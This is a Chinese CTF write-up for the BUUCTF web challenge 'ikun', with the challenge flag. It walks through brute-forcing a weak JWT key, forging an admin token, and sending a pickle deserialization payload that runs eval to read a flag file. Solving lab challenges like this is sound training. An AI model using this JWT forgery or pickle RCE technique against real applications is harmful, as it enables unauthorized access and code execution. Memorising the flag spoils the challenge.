---
title: "[CISCN2019 华北赛区 Day1 Web2]ikun"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [jwt, pickle-deserialization, tornado, weak-key]
vulnerability: JWT 弱密钥 + Pickle 反序列化 RCE
solved: true
flag: "flag{5646f357-21ba-42de-84da-ed95cbfa8de9}"
---

# [CISCN2019 华北赛区 Day1 Web2]ikun

## 题目概述
一个基于 Tornado 框架的电商网站，需要购买 lv6 等级商品才能获取 flag。题目提示"后门藏在 lv6 里"。

## 信息收集
1. 访问题目，发现重定向到 `/shop`，是一个商品展示页面
2. 页面提示"一定要买到lv6"，搜索发现 lv6 商品在第 181 页
3. lv6 商品价格 1145141919.0，远超用户初始余额
4. 注册登录后，JWT cookie 使用 HS256 算法
5. 购买 lv6 商品后，页面显示源码下载链接 `/static/asd1f654e683wq/www.zip`

## 漏洞分析（漏洞类型、原理、判断过程）

### 漏洞1: JWT 弱密钥
- JWT 使用 HS256 算法，密钥可通过字典爆破
- 使用 `pyjwt` 库尝试常见密码，发现密钥为 `1Kun`
- 伪造 admin 用户 JWT：`{"username": "admin"}`

### 漏洞2: Pickle 反序列化 RCE
- 源码 `Admin.py` 中存在 pickle 反序列化漏洞：
```python
become = self.get_argument('become')
p = pickle.loads(urllib.unquote(become))
return self.render('form.html', res=p, member=1)
```
- 访问 `/b1g_m4mber` 端点（购买 lv6 后重定向）可触发此漏洞
- 服务端为 Python 2，需使用 protocol 0 的 pickle payload

## 利用过程（Payload + Flag）

### Step 1: 爆破 JWT 密钥
```python
import jwt
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
for pwd in ['1Kun', 'ikun', ...]:
    try:
        decoded = jwt.decode(jwt_token, pwd, algorithms=['HS256'])
        print(f"Found key: {pwd}")  # 输出: 1Kun
    except: pass
```

### Step 2: 伪造 Admin JWT
```python
admin_jwt = jwt.encode({"username": "admin"}, "1Kun", algorithm="HS256")
```

### Step 3: 构造 Pickle RCE Payload
```python
import pickle, urllib

class RCE:
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

payload = pickle.dumps(RCE(), protocol=0)  # protocol 0 兼容 Python 2
payload_encoded = urllib.parse.quote(payload)
```

### Step 4: 发送 Payload 获取 Flag
```python
data = {"_xsrf": xsrf, "become": payload_encoded}
resp = s.post(f"{BASE_URL}/b1g_m4mber", data=data)
# 响应中包含 flag{5646f357-21ba-42de-84da-ed95cbfa8de9}
```

## 复现步骤
1. 注册账号并登录，获取 JWT
2. 爆破 JWT 密钥得到 `1Kun`
3. 伪造 admin 用户 JWT
4. 访问 `/b1g_m4mber` 页面获取 XSRF token
5. 构造 pickle 反序列化 payload 读取 `/flag.txt`
6. POST 发送 payload，从响应中提取 flag

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| JWT 弱密钥 | 登录返回的 JWT cookie | 字典爆破密钥 `1Kun` | JWT 安全、HS256 算法 |
| Pickle 反序列化 | `/b1g_m4mber` POST 参数 `become` | `pickle.dumps(RCE(), protocol=0)` | Python pickle RCE、Python 2/3 兼容 |

## 知识总结
- JWT 弱密钥是常见考点，优先尝试题目相关词汇（如本题的 `1Kun`）
- Pickle 反序列化需注意 Python 版本兼容性，protocol 0 是通用格式
- Tornado 框架的 `get_secure_cookie` 使用 HMAC 签名，密钥在 `settings.py` 中
- 源码泄露是重要线索，本题通过购买 lv6 触发源码下载链接显示
